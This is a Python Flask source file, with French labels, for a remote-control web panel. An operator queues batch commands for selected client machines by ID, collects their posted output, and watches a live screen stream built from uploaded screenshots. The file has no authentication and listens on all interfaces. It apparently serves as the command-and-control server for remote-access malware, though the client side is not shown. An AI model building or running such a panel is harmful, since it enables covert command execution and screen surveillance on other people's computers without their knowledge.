from flask import (
    Flask, request, render_template_string,
    send_file, redirect, url_for, Response
)
import time
import threading

app = Flask(__name__)

# État global
commande = ""
resultat_commande = ""
destinataires = ""
mode = "cmd"        # "cmd" ou "live"
last_host = ""      # hostname du dernier screenshot reçu

# Template HTML
html_page = """
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Console & Live Screen</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    form { margin-bottom: 15px; }
    .section { margin-top: 30px; }
    #stream { max-width:90vw; border:1px solid #ccc; display:block; }
  </style>
</head>
<body>
  <h1>🖥️ Contrôle à Distance</h1>

  <!-- Choix du mode -->
  <div class="section">
    <h2>Mode</h2>
    <form action="/set_mode" method="POST" style="display:inline">
      <button type="submit" name="mode" value="live"
        {% if mode == 'live' %}disabled{% endif %}>
        🔴 Live
      </button>
    </form>
    <form action="/set_mode" method="POST" style="display:inline">
      <button type="submit" name="mode" value="cmd"
        {% if mode == 'cmd' %}disabled{% endif %}>
        ⚪ Commande
      </button>
    </form>
  </div>

  {% if mode == 'cmd' %}
  <!-- Section Commande -->
  <div class="section">
    <h2>Envoyer une commande batch</h2>
    <form action="/" method="POST">
      <input type="text" name="commande" value="{{ commande }}"
             placeholder="Commande batch" size="50">
      <br><br>
      <label>Destinataires (* = tous, !ID pour exclure) :</label>
      <input type="text" name="destinataires" value="{{ destinataires }}"
             placeholder="* ou ID1,ID2,...">
      <button type="submit">Envoyer</button>
    </form>
    <form action="/clear_output" method="POST">
      <button type="submit">Effacer les résultats</button>
    </form>
    <p><strong>Dernière commande :</strong> {{ commande or "(aucune)" }}</p>
    <p><strong>Destinataires :</strong> {{ destinataires or "(aucun)" }}</p>
    <h3>Résultat de la commande :</h3>
    <pre>{{ resultat_commande or "(vide)" }}</pre>
  </div>
  {% endif %}

  {% if mode == 'live' %}
  <!-- Section Live Screen -->
  <div class="section">
    <h2>Live Screen</h2>
    <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
    <!-- MJPEG Stream -->
    <img id="stream" src="/mjpeg" alt="Live screen">
  </div>
  {% endif %}
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    global commande, destinataires
    if request.method == "POST":
        commande = request.form.get("commande", "").strip()
        destinataires = request.form.get("destinataires", "").strip()
    return render_template_string(
        html_page,
        commande=commande,
        destinataires=destinataires,
        resultat_commande=resultat_commande,
        mode=mode,
        last_host=last_host
    )

@app.route("/set_mode", methods=["POST"])
def set_mode():
    global mode
    m = request.form.get("mode", "")
    if m in ("live", "cmd"):
        mode = m
    return redirect(url_for("index"))

@app.route("/get_mode")
def get_mode():
    return mode

@app.route("/get_commande")
def get_commande():
    global commande, destinataires
    mid = request.args.get('id','')
    if not mid:
        return "", 400

    if destinataires == "*":
        return commande
    elif destinataires.startswith("!"):
        excl = [i.strip() for i in destinataires[1:].split(",")]
        return commande if mid not in excl else ""
    else:
        incl = [i.strip() for i in destinataires.split(",")]
        return commande if mid in incl else ""

@app.route("/post_resultat", methods=["POST"])
def post_resultat():
    global resultat_commande
    mid = request.form.get("id","").strip()
    res = request.form.get("resultat","")
    resultat_commande += f"\n[{mid}]\n{res}\n"
    return "OK", 200

@app.route("/clear_output", methods=["POST"])
def clear_output():
    global resultat_commande
    resultat_commande = ""
    return redirect(url_for("index"))

@app.route("/post_screen", methods=["POST"])
def post_screen():
    global last_host
    f = request.files.get("screen")
    mid = request.form.get("id","").strip()
    if not f or not mid:
        return "Bad Request", 400
    f.save("latest.png")
    last_host = mid
    return "Screenshot reçu", 200

@app.route("/screen.png")
def screen_png():
    try:
        return send_file("latest.png", mimetype="image/png")
    except FileNotFoundError:
        return "", 404

# --- Nouveau : endpoint MJPEG ---
def mjpeg_generator():
    """Génère un flux multipart/x-mixed-replace à partir de latest.png"""
    boundary = b"--frame"
    while True:
        try:
            with open("latest.png", "rb") as img:
                frame = img.read()
            yield boundary + b"\r\n" + \
                  b"Content-Type: image/png\r\n\r\n" + \
                  frame + b"\r\n"
        except FileNotFoundError:
            # pas encore d'image, on attend un peu
            time.sleep(0.1)
            continue
        # on peut ajuster ce délai si besoin
        time.sleep(0.1)

@app.route("/mjpeg")
def mjpeg():
    return Response(
        mjpeg_generator(),
        mimetype="multipart/x-mixed-replace; boundary=frame"
    )

if __name__ == "__main__":
    # Lance le serveur
    app.run(host="0.0.0.0", port=5000, threaded=True)
